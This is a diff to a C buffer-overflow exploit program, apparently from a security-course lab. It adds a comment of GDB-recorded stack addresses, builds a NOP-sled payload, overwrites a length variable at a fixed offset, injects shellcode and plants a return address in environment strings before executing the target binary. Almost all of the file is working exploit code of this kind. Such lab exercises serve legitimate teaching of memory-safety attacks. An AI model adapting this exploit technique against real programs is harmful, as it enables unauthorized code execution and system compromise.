@@ -9,28 +9,47 @@
 #define ADDR_LEN 4
 #define REST_LEN 284 - LENGTH + 2
 
+/*
+    Useful info collected from GDB logs:
+
+    (gdb) p &buf
+    $2 = (char (*)[256]) 0x3021fd80
+    (gdb) p &len
+    $3 = (int *) 0x3021fe88
+    (gdb) p &i
+    $4 = (int *) 0x3021fe8c
+
+    Saved registers:
+    rbp at 0x3021fe90, rip at 0x3021fe98
+    */
+
 int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[5];
 
-	char exploit[LENGTH] = "";
+	char buf[LENGTH] = "";
 
-	int i = 0;
-	while(i < (LENGTH - ADDR_LEN) / ADDR_LEN){
-		strcat(exploit, "\x50\xfe\x21\x30"); // garbage value
-		i++;
-	}
+	// Fill up the buffer with NOP
+    for (int i = 0 ; i < LENGTH; i++) {
+        // NOP is '\x90' for intel x86
+        buf[i] = '\x90';
+    }
 	
-	strcat(exploit, "\x1b\x01\x00\x00"); // offset hex(283) = 0x11b
+	// Overwrite len
+    buf[264] = '\x1b';
+    buf[265] = '\x01';
+	buf[266] = '\x00';
+    buf[267] = '\x00';
 
-	for(i = 0; i < strlen(shellcode); i++){
-		exploit[i] = shellcode[i];
-	}
+    // Inject shellcode into the buffer
+    for (int i = 0; i < 45; i++) {
+        buf[i] = shellcode[i];
+    }
 
 	args[0] = TARGET;
-	args[1] = exploit;
+	args[1] = buf;
 	args[2] = NULL; 
 
 	env[0] = "\x00"; // complete the address of var(len)
@@ -38,7 +57,9 @@ main ( int argc, char * argv[] )
 	env[1] = "\x17\x01\x00\x00"; // offset hex(279) = 0x117
 	env[2] = "\x00"; 
 	
-	env[3] = "\x80\xfd\x21\x30\x80\xfd\x21\x30\x80\xfd\x21\x30";
+	env[3] = "\x90\x90\x90\x90"
+			 "\x90\x90\x90\x90"
+			 "\x80\xfd\x21\x30";
 	env[4] = NULL;
 
 	if (execve (TARGET, args, env) < 0)
